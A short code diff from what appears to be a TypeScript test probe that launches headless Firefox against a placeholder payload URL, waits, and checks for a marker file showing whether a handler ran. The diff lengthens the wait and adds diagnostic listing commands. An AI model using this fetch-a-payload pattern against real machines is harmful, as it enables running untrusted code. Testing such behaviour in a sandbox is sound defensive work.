@@ -117,11 +117,11 @@ const firefoxFetchesPayload = async (): Promise<boolean> => {
   exec(
     "nohup /usr/bin/firefox-esr --headless --no-remote http://payload.invalid/x > /tmp/ff-probe.log 2>&1 &",
   );
-  await sleep(20_000);
+  await sleep(40_000);
   const ran = exec("test -e /workspace/ff-handler-ran && echo ran || echo clean").out.trim();
   if (ran !== "ran") {
     const why = exec(
-      "/usr/bin/ps -eo pid,args | /usr/bin/grep -E 'firefox|proxy|python' | /usr/bin/cut -c1-150 | /usr/bin/head -8; /usr/bin/head -n 8 /tmp/ff-proxy.log /tmp/ff-probe.log | /usr/bin/cut -c1-200; ls /workspace",
+      "/usr/bin/ps -eo pid,args | /usr/bin/grep -E 'firefox|proxy|python' | /usr/bin/cut -c1-150 | /usr/bin/head -8; /usr/bin/head -n 8 /tmp/ff-proxy.log /tmp/ff-probe.log | /usr/bin/cut -c1-200; ls /workspace /workspace/Downloads; cat /workspace/ok 2>/dev/null",
     ).out;
     process.stdout.write(`[real] firefox probe did not run the handler: ${why}\n`);
   }
